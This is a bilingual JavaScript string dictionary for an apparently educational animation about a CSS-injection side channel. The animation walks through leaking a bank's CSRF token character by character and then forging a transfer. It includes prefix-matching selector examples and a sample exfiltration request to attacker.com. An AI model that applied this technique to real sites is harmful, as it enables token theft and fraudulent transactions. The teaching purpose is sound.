// Real-World Technical Narrative Dictionary (Bilingual)
export const I18N = {
  vi: {
    bannerBadge: "Bảo Mật Thực Chiến",
    bannerTitle: "Kênh Kề CSS Injection & Đột Phá CSRF",
    bannerSubtitle: "Hiểu đúng bản chất: Cách nhận diện lỗ hổng, so khớp tiền tố, đọc Access Log và bẻ gãy phòng thủ CSRF",
    sceneOf: (curr, total) => `PHÂN CẢNH ${curr} / ${total}`,
    hotkeyTip: "Phím tắt: [Space] Dừng/Phát • [←/→] Đổi cảnh • [R] Bắt đầu lại • [M] Âm thanh • [L] Ngôn ngữ",
    realms: {
      attacker: { name: "Vùng Kẻ Tấn Công", sub: "Gửi quy tắc CSS & Đọc HTTP Access Log" },
      app: { name: "Máy Chủ Ứng Dụng (Ngân Hàng)", sub: "Bị lỗi chèn thẳng CSS vào trang HTML" },
      victim: { name: "Trình Duyệt Nạn Nhân", sub: "Lưu phiên đăng nhập & Form CSRF bí mật" }
    },
    nodes: {
      attacker: "Kẻ Tấn Công",
      attackerSub: "Dò tìm & Bơm CSS độc hại",
      attackerDoc: "Bảng Quy Tắc CSS Dò Ký Tự",
      attackerDocSub: "input[value^='s'] { background: url(...) }",
      attackerServer: "Máy Chủ Kẻ Tấn Công",
      attackerServerSub: "Lắng nghe HTTP Access Log",
      webApp: "Máy Chủ Ứng Dụng",
      webAppSub: "Không lọc/escape dữ liệu người dùng",
      victimClient: "Trình Duyệt Nạn Nhân",
      victimClientSub: "Chứa Cookie phiên & CSRF Token",
      dom: "Form Chuyển Tiền Của Nạn Nhân",
      cssEngine: "Bộ Phân Tích CSS Trình Duyệt",
      privateState: val => `<input type="hidden" name="csrf" value="${val}">`,
      privateStateSub: "Mã chống tấn công CSRF do ngân hàng cấp"
    },
    scenes: {
      1: {
        title: "Bối Cảnh: Tại Sao CSRF Token Lại Cực Kỳ Quan Trọng?",
        subtitle: "Trình duyệt tự đính kèm Cookie đăng nhập trong mọi request. Nếu không có CSRF Token, kẻ xấu có thể chuyển sạch tiền của bạn!"
      },
      2: {
        title: "Nhận Diện Lỗ Hổng: Kẻ Tấn Công Phát Hiện Điểm Yếu Ra Sao?",
        subtitle: "Kẻ tấn công nhập thử thẻ <style> vào ô Bio/Theme. Thấy trang đổi màu -> Biết ngay server bị lỗi nhúng CSS (Unescaped Injection)!"
      },
      3: {
        title: "Kẻ Tấn Công Soạn Bộ Quy Tắc CSS Đoán Ký Tự",
        subtitle: "Không biết token là gì, kẻ xấu tạo danh sách kiểm tra mọi chữ (a-z): Nếu bắt đầu bằng chữ nào thì tải ảnh chứa chữ đó!"
      },
      4: {
        title: "Máy Chủ Nhúng CSS Độc Vào Trang Của Nạn Nhân",
        subtitle: "Nạn nhân mở trang ngân hàng. Server vô tình gửi về cả Form bí mật (token='secret_42') lẫn bảng CSS độc của kẻ tấn công."
      },
      5: {
        title: "Khoảnh Khắc Then Chốt: Trình Duyệt Nạn Nhân Tự So Khớp",
        subtitle: "Toàn bộ việc kiểm tra diễn ra CỤC BỘ TRÊN MÁY NẠN NHÂN. Trình duyệt duyệt qua từng luật CSS để so sánh với thẻ input trong DOM."
      },
      6: {
        title: "Tại Sao Phải Dùng CSS? (Vượt Qua Rào Cản CSP)",
        subtitle: "Chính sách CSP chặn đứng JavaScript (không thể XSS đọc biến). Nhưng CSS vẫn được phép chạy -> Buộc phải dùng kênh kề (Side-Channel)!"
      },
      7: {
        title: "Bản Chất So Khớp: Tại Sao 'a' Trượt mà 's' Khớp?",
        subtitle: "Token là 'secret_42'. Luật [value^='a'] sai nên im lặng; Luật [value^='s'] ĐÚNG -> Trình duyệt bắt buộc phải tải ảnh nền của chữ 's'!"
      },
      8: {
        title: "Trình Duyệt Tự Gửi HTTP Request (F12 Network)",
        subtitle: "Để hiển thị ảnh nền, chính trình duyệt tự động gọi: GET https://attacker.com/leak?char=s (Hiện rõ trong F12 Network)!"
      },
      9: {
        title: "Kẻ Tấn Công Đọc Access Log & Suy Ra Ký Tự",
        subtitle: "Mở file log Nginx: Thấy có request /leak?char=s -> Kẻ xấu chắc chắn 100% ký tự đầu tiên của CSRF Token là chữ 's'!"
      },
      10: {
        title: "Vòng Lặp Dò Ký Tự: Trộm Trọn Vẹn Chuỗi Token",
        subtitle: "Biết 's' -> Dò 'se' -> Dò 'sec' -> Dò 'secret_42'. Lặp lại từng đợt cho đến khi trích xuất được toàn bộ mã bí mật!"
      },
      11: {
        title: "Hậu Quả: Dùng Token Vừa Trộm Để Chuyển Hết Tiền (CSRF)",
        subtitle: "Có được token 'secret_42', kẻ xấu gửi request chuyển 100tr kèm Cookie của nạn nhân -> Ngân hàng chấp thuận -> Mất tiền!"
      }
    }
  },

  en: {
    bannerBadge: "Offensive Security",
    bannerTitle: "CSS Injection Side-Channel & CSRF Exploitation",
    bannerSubtitle: "Real-world mechanics: Vulnerability discovery, prefix matching, access log deduction, and breaking CSRF defense",
    sceneOf: (curr, total) => `SCENE ${curr} OF ${total}`,
    hotkeyTip: "Keyboard: [Space] Play/Pause • [←/→] Navigate • [R] Restart • [M] Mute • [L] Lang",
    realms: {
      attacker: { name: "Attacker Domain", sub: "Injects CSS rules & reads HTTP access logs" },
      app: { name: "Target Web Server (Bank)", sub: "Reflects unescaped input into HTML response" },
      victim: { name: "Victim Browser", sub: "Holds active login cookies & hidden CSRF token" }
    },
    nodes: {
      attacker: "Attacker",
      attackerSub: "Recon & CSS Payload Injection",
      attackerDoc: "CSS Brute-Force Rule Matrix",
      attackerDocSub: "input[value^='s'] { background: url(...) }",
      attackerServer: "Attacker Server",
      attackerServerSub: "Capturing incoming HTTP requests",
      webApp: "Web Application",
      webAppSub: "Vulnerable unescaped reflection",
      victimClient: "Victim Client",
      victimClientSub: "Local DOM & CSS execution environment",
      dom: "Victim Transfer Form",
      cssEngine: "Browser CSS Parser",
      privateState: val => `<input type="hidden" name="csrf" value="${val}">`,
      privateStateSub: "Anti-CSRF defense token generated by server"
    },
    scenes: {
      1: {
        title: "Why Anti-CSRF Tokens Are Absolutely Vital",
        subtitle: "Browsers automatically attach login cookies on cross-origin requests. Without a secret CSRF token, malicious sites could drain your account!"
      },
      2: {
        title: "Vulnerability Discovery: How Attackers Spot CSS Injection",
        subtitle: "Attacker injects a test style `<style>body{color:red}</style>`. The page turns red -> Confirmed: Unescaped CSS Injection flaw exists!"
      },
      3: {
        title: "Crafting the Prefix-Matching CSS Rule Matrix",
        subtitle: "Not knowing the token, attacker crafts rules for every letter (a-z): whichever letter matches will trigger a background fetch for that char!"
      },
      4: {
        title: "Server Serves Injected CSS to the Victim",
        subtitle: "Victim opens banking profile. Server inadvertently serves both the victim's secret form (`token='secret_42'`) and the attacker's CSS."
      },
      5: {
        title: "The Critical Moment: Victim's Browser Evaluates Locally",
        subtitle: "Execution occurs COMPLETELY INSIDE THE VICTIM'S BROWSER. The CSS engine iterates through selectors to find matching DOM elements."
      },
      6: {
        title: "Why CSS? (Bypassing Strict CSP Restrictions)",
        subtitle: "Content Security Policy blocks JavaScript execution (XSS is neutralized). But CSS rules are permitted -> Attackers pivot to side-channels!"
      },
      7: {
        title: "The Prefix Match: Why 'a' Fails and 's' Triggers",
        subtitle: "Token is 'secret_42'. Rule `[value^='a']` is false (silent); Rule `[value^='s']` is TRUE -> Browser MUST compute `background-image` for 's'!"
      },
      8: {
        title: "Browser Autonomously Fires HTTP Request (F12 Network)",
        subtitle: "To display the matched background image, the browser issues: GET https://attacker.com/leak?char=s (Visible in F12 Network)!"
      },
      9: {
        title: "Attacker Inspects Access Log & Deduces First Char",
        subtitle: "Nginx access log displays `/leak?char=s` -> Attacker proves with 100% certainty that the secret token begins with 's'!"
      },
      10: {
        title: "Iterative Character-by-Character Extraction Loop",
        subtitle: "Known 's' -> Probe 'se' -> Probe 'sec' -> Probe 'secret_42'. Recursive passes extract the entire secret token string!"
      },
      11: {
        title: "The Final Strike: Exploiting Leaked Token to Bypass CSRF",
        subtitle: "Armed with stolen `secret_42`, attacker submits forged transfer request with victim's cookies -> Bank verifies token -> Money stolen!"
      }
    }
  }
};
